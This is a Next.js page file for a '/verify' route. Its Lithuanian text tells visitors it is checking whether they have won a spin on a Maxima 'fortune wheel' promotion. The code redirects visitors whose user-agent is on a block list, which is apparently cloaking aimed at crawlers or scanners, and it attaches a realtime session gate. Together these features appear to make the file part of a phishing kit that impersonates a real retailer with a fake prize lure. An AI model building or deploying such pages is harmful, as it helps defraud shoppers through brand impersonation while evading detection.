import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { resumeOrRedirectHome } from "@/lib/session-resume";
import { buildShareMetadata } from "@/lib/share-metadata";
import { VerifyClient } from "./verify-client";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "Maxima — Tikrinama...",
    description:
      "Tikrinama, ar laimėjote teisę sukti laimės ratą. Maxima specialioji akcija.",
    canonical: "/verify",
  });
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function VerifyPage({ searchParams }: Props) {
  const params = await searchParams;
  const h = await headers();
  const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
  if (blockedUrl) redirect(blockedUrl);
  await resumeOrRedirectHome(params);

  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: params,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <VerifyClient sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
    </>
  );
}
